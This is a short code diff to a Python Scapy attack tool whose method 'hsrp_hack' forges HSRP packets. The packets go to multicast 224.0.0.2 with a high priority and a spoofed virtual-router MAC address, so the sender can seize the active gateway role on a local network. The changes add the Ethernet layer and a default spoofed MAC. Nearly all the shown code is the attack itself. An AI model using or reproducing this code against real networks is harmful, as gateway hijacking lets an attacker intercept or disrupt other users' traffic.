@@ -25,6 +25,7 @@ class Attack:
         sendp(toSend, iface=self.iface)
     
     def hsrp_hack(self):
+        ether = Ether(src=self.srcHW, dst="01:00:5e:00:00:02")
         ip = IP(src=self.srcIP, dst='224.0.0.2')
         udp = UDP(sport=1985,dport=1985)
         hsrp = HSRP(group=self.group, priority=self.priority, virtualIP=self.vIP)
@@ -76,7 +77,7 @@ def menu():
         att_choice = choose_attack()
         iface = choose_inter()
         srcIP = input("Source IP ("+ get_if_addr(iface)+"): ")
-        srcHW = input("Source HW ("+ get_if_hwaddr(iface)+"): ")
+        srcHW = input("Source HW (00:00:0c:07:ac:01): ")
         group = input("HSRP Group (1): ")
         priority = input("HSRP Priority (250): ")
         vIP = input("HSRP Virtual IP (192.168.1.254): ")
